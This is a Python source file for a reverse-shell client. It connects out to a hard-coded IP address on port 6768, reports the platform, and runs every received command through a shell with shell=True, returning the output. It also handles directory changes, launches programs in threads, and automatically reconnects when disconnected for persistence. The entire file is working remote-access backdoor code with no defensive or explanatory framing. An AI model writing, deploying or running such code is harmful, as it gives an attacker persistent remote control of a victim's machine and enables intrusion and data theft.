from subprocess import PIPE, Popen
import socket, os
from sys import platform
from threading import Thread


class Shell:

	def __init__(self, host, port=6768):
		self.output = []
		self.path = os.getcwd().replace("\\", "/")
		self.prompt = self.bind(host, port)

	def bind(self, host, port):
		return socket.create_connection((host, port))

	def send_initial_data(self):
		data = f"{platform}-0"
		self.prompt.send(data.encode("utf-8"))

	def recv_command(self):
		command = self.prompt.recv(1024)
		return command.decode()

	def run_command(self, command):
		output = Popen(command, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, cwd=self.path)
		self.prompt.sendall(output.stdout.read() + output.stderr.read())
		self.prompt.send(b"\x04")  # end of sending data

	def change_dict(self, command):
		if command == "cd":
			self.run_command(command)
		else:
			command = command.replace("cd ", "")
			if command == "..":
				self.path = self.path.split("/")
				self.path.remove(self.path[-1])
				if len(self.path) == 1:
					self.path.append("")
				self.path = "/".join(self.path)
			elif command == ".":
				pass
			else:
				if os.path.exists(command):
					self.path = command
				else:
					self.path = os.path.join(self.path, command)
					self.path = self.path.replace("\\", "/")
			self.prompt.send(b"\x04")

	def run_program(self, start_program):
		Thread(target=lambda:os.system(f"{start_program}")).start()

def persistent_connection():
	#try:
	cxn = Shell("192.168.1.88")
	cxn.send_initial_data()
	while True:
		command = cxn.recv_command()
		cxn.output = []
		if command.lower() == "exit" or command.lower() == "disconnect":
			cxn.prompt.close()
			persistent_connection()
		elif "cd" == command[0:2]:
			cxn.change_dict(command)
		elif "savefile" == command[:8]:
			name_file = command.replace("savefile ", "")
			#cxn.send_file(name_file)
		elif "sendfile" == command:
			pass
			#cxn.recv_file()
		elif command[0:3] == "run":
			command = command.replace("run ", "")
			cxn.run_program(command)
		else:
			if command == "":
				persistent_connection()
			cxn.run_command(command)
	#except Exception as err:
	#	print(err)
#while True:
	#try:
#		pass
#	finally:
persistent_connection()
		#time.sleep(0.05)
